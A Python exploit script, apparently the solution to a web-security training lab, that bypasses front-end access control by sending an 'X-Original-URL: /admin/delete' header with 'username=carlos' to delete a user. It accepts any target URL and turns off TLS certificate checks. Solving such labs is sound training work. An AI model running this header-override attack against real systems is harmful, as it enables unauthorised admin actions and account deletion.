"""
    Lab: URL-based access control can be circumvented

    Exploit steps:
    1. Send a GET request to `/` with the header `X-Original-URL: /admin/delete`
       and query string `?username=carlos`.
    2. The back-end will interpret the path as `/admin/delete?username=carlos`,
       bypassing the front-end access control.

    Author: D4mn20
"""

import argparse
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://target.com)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")
    session = requests.Session()

    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.BLUE}Starting...{Fore.RESET}")
    print(f"{Fore.YELLOW}STEP 1:{Fore.RESET} Attempting to delete user 'carlos'...")

    path = "/"
    params = {"username": "carlos"}
    headers = {
        "X-Original-URL": "/admin/delete"
    }

    try:
        res = session.get(f"{base_url}{path}", headers=headers, params=params, allow_redirects=False)
        print(f"{Fore.CYAN}[REQUEST]{Fore.RESET} GET {path}?username=carlos - Status: {res.status_code}")
        if res.status_code == 302:
            print(f"{Fore.GREEN}[+] Successfully deleted carlos user. Lab solved!{Fore.RESET}")
        else:
            print(f"{Fore.RED}[-] Failed to delete carlos user. Status: {res.status_code}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}[-] Request failed: {e}{Fore.RESET}")
        exit(1)

if __name__ == "__main__":
    main()
